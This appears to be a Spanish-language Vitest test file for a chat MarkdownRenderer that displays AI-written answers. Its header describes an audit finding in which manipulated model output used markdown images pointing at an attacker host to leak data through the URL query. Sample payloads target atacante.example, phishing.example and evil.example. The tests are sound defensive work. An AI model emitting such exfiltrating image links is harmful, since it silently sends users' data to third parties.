/**
 * @vitest-environment happy-dom
 */

/**
 * El chat pinta markdown escrito por un modelo (auditoría de seguridad 23-09).
 * Una respuesta manipulada con `![](https://atacante/x?d=<datos>)` hacía que el
 * navegador pidiera esa URL solo, sin clic, con los datos en la query. Estas
 * pruebas fijan que ninguna imagen se carga y que un enlace a otro sitio dice
 * adónde va.
 */

import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it, vi } from 'vitest';

const { chat } = vi.hoisted(() => ({
  chat: { actual: null as null | { sendMessage: ReturnType<typeof vi.fn>; isThinking: boolean; isStreaming: boolean; isAgentsRunning: boolean } },
}));
vi.mock('@/lib/i18n', async () => await import('@/lib/i18n/i18n-test-stub'));
vi.mock('@/lib/context/BetaChatContext', () => ({ useBetaChatOpcional: () => chat.actual }));

import { MarkdownRenderer, destinoExterno } from './MarkdownRenderer';

function render(elemento: React.ReactElement): { container: HTMLElement } {
  const container = document.createElement('div');
  container.innerHTML = renderToStaticMarkup(elemento);
  return { container };
}

describe('MarkdownRenderer — respuestas de IA', () => {
  it('una imagen NO se carga: queda como texto con su destino', () => {
    const { container } = render(
      <MarkdownRenderer content={'Mira: ![cartera](https://atacante.example/x.png?d=SALDO-123)'} />,
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.textContent).toContain('Imagen: cartera');
    expect(container.textContent).toContain('atacante.example');
  });

  it('un enlace a otro sitio muestra su dominio al lado del texto', () => {
    const { container } = render(
      <MarkdownRenderer content={'[Ver estado de cuenta](https://phishing.example/login)'} />,
    );
    const a = container.querySelector('a')!;
    expect(a.textContent).toContain('Ver estado de cuenta');
    expect(a.textContent).toContain('phishing.example/login');
    expect(a.getAttribute('rel')).toContain('noopener');
  });

  it('un enlace a otro sitio avisa que se abre en otra pestaña', () => {
    const { container } = render(<MarkdownRenderer content={'[Wompi](https://checkout.wompi.co/l/abc)'} />);
    const a = container.querySelector('a')!;
    expect(a.getAttribute('target')).toBe('_blank');
    expect(a.getAttribute('aria-label')).toContain('se abre en otra pestaña (checkout.wompi.co/l/abc)');
  });

  // 🔴 Nico, 23-09 (22:51): «Debe todo funcionar dentro del chat». Un enlace
  // interno abría la pantalla del panel en otra pestaña.
  it('un enlace INTERNO no navega: sin chat es texto; con chat, un mensaje de la persona con intención', async () => {
    const sinChat = render(<MarkdownRenderer content={'[Contratos](/panel/inmobiliaria/contratos)'} />);
    expect(sinChat.container.querySelector('a')).toBeNull();
    expect(sinChat.container.textContent).toBe('Contratos');

    const { createRoot } = await import('react-dom/client');
    const { act } = await import('react');
    (globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;
    chat.actual = { sendMessage: vi.fn(), isThinking: false, isStreaming: false, isAgentsRunning: false };
    const el = document.createElement('div');
    document.body.appendChild(el);
    const root = createRoot(el);
    act(() =>
      root.render(
        <MarkdownRenderer content={'Mira [el contrato #24](/panel/inmobiliaria/contratos/4a23f784-2050-4874-bfc4-bc9d1352794a).'} />,
      ),
    );
    expect(el.querySelector('a')).toBeNull();
    const boton = el.querySelector('button')!;
    act(() => boton.click());
    expect(chat.actual.sendMessage).toHaveBeenCalledWith('el contrato #24', {
      intencion: { accion: 'ver', entidad: { tipo: 'contrato', id: '4a23f784-2050-4874-bfc4-bc9d1352794a' } },
    });
    act(() => root.unmount());
    el.remove();
    chat.actual = null;
  });

  it('el correo sale UNA vez (antes: «mateo@example.com (mateo@example.com)»)', () => {
    const { container } = render(<MarkdownRenderer content={'Su correo es mateo.perez@example.com.'} />);
    expect(container.textContent).toBe('Su correo es mateo.perez@example.com.');
    expect(container.querySelector('a')).toBeNull();
  });

  it('destinoExterno recorta rutas largas y deja fuera lo interno', () => {
    expect(destinoExterno('/panel/x')).toBeNull();
    expect(destinoExterno('#arriba')).toBeNull();
    expect(destinoExterno('//evil.example/a')).toBe('evil.example/a');
    expect(destinoExterno('https://a.example/' + 'b'.repeat(50))).toMatch(/^a\.example\/b{29}…$/);
  });
});

/**
 * El final del revelado (Nico, 23-09: «que se sienta pulido»). Pasados los
 * primeros ~250 caracteres el texto llega por palabras y luego por bloques
 * (`src/lib/chat/revelado.ts`); sin fundido eso parpadea. Lo nuevo se envuelve
 * en un elemento que se funde; el tecleo de una sola letra no.
 */
describe('MarkdownRenderer — el texto recién revelado se funde', () => {
  async function montar() {
    const { createRoot } = await import('react-dom/client');
    const { act } = await import('react');
    (globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;
    const container = document.createElement('div');
    document.body.appendChild(container);
    const root = createRoot(container);
    return {
      container,
      pintar: (content: string, isStreaming = true) =>
        act(() => root.render(<MarkdownRenderer content={content} isStreaming={isStreaming} />)),
      soltar: () => {
        act(() => root.unmount());
        container.remove();
      },
    };
  }

  it('un bloque de varias palabras entra con fundido; lo ya visible no se vuelve a animar', async () => {
    const m = await montar();
    m.pintar('Tienes 29 contratos');
    m.pintar('Tienes 29 contratos que vencen en octubre.');
    const fundidos = [...m.container.querySelectorAll('span.animate-in')];
    expect(fundidos.map((s) => s.textContent).join('')).toBe(' que vencen en octubre.');
    m.soltar();
  });

  it('una letra más es el tecleo de siempre: sin fundido', async () => {
    const m = await montar();
    m.pintar('Tienes 2');
    m.pintar('Tienes 29');
    expect(m.container.querySelector('span.animate-in')).toBeNull();
    m.soltar();
  });

  it('terminada la respuesta no queda ningún envoltorio', async () => {
    const m = await montar();
    m.pintar('Tienes 29');
    m.pintar('Tienes 29 contratos que vencen en octubre.');
    m.pintar('Tienes 29 contratos que vencen en octubre.', false);
    expect(m.container.querySelector('span.animate-in')).toBeNull();
    expect(m.container.textContent).toBe('Tienes 29 contratos que vencen en octubre.');
    m.soltar();
  });
});
